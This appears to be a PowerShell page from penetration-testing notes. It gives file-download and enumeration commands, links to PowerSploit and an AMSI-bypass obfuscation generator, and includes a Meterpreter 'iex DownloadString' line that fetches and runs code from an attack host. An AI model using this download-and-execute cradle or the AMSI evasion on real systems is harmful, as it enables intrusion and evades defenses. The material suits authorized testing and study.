##### [Execute PowerUp.ps1](../../../../Tools/Shells/Windows/PowerShell/PowerSploit/PowerUp.md)

# Download File
##### Download File To Disk
```bash
powershell -c wget "http://<Source Address>/<Source File>" -outfile "<Output File>"
```

### Download File To String
##### From Meterpreter PowerShell Prompt
```bash
PS > iex (New-Object Net.WebClient).DownloadString('http://[Attack Host]/[Source File]')
```

# Processes
##### Get list of processes running, sorted by name.
```powershell
tasklist /NH | sort
```

```bash
whoami /priv
```

# Services
##### Get List of Running Services
```powershell
powershell Get-Service
```

# [From Meterpreter](../../../Metasploit/README.MD#PowerShell)

# References
##### [Generates obfuscated PowerShell snippets](https://amsi.fail/)

##### [Approved Verbs for PowerShell Commands](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.2&viewFallbackFrom=powershell-7.1)

##### [Everything you wanted to know about the if statement](https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/everything-about-if?view=powershell-7.2&viewFallbackFrom=powershell-7.1)

##### [How to run a PowerShell script from the command prompt?](https://www.tutorialspoint.com/how-to-run-a-powershell-script-from-the-command-prompt)

##### [Learn X in Y minutes](https://learnxinyminutes.com/docs/powershell/)

##### [Powershell](https://chryzsh.gitbooks.io/darthsidious/content/enumeration/powershell.html)

##### [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)

##### [PowerShellMafia](https://github.com/PowerShellMafia)

##### [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

##### [Use Windows PowerShell to search for files](https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/)

##### [Where-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.2&viewFallbackFrom=powershell-7.1)